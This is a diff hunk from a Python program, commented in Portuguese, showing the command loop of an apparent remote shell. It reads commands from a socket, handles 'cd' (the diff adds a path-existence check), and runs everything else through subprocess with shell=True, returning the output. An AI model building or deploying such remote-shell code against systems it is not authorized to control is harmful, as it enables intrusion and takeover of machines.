@@ -71,16 +71,18 @@ def executa(socket):
                             if(dados == 'shell'):
                                 pass
                             else:
-                                if(dados.split(' ')[0] == 'cd'):
+                                if(dados.split(' ')[0] == 'cd'): # trocar de diretorio
                                     try:
                                         pasta = (dados.split(' ')[1])
-                                        caminho = os.chdir(pasta.rstrip('\n'))
-                                        local = os.getcwd()
-                                        socket.send(local)
+                                        if(os.path.isdir(pasta)):
+                                            caminho = os.chdir(pasta.rstrip('\n'))
+                                            local = os.getcwd()
+                                            socket.send(local)
+                                        else:
+                                            socket.send('caminho não existe\n'+ os.getcwd())
                                     except Exception as e:
-                                        socket.send('Erro a trocar de diretorio -> ' + e)
-
-                                else:
+                                        socket.send('Error -> '+ e)
+                                else: # executa o comando
                                     comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                                     retorno = comando.stdout.read() + comando.stderr.read()
                                     print('enviando',retorno)
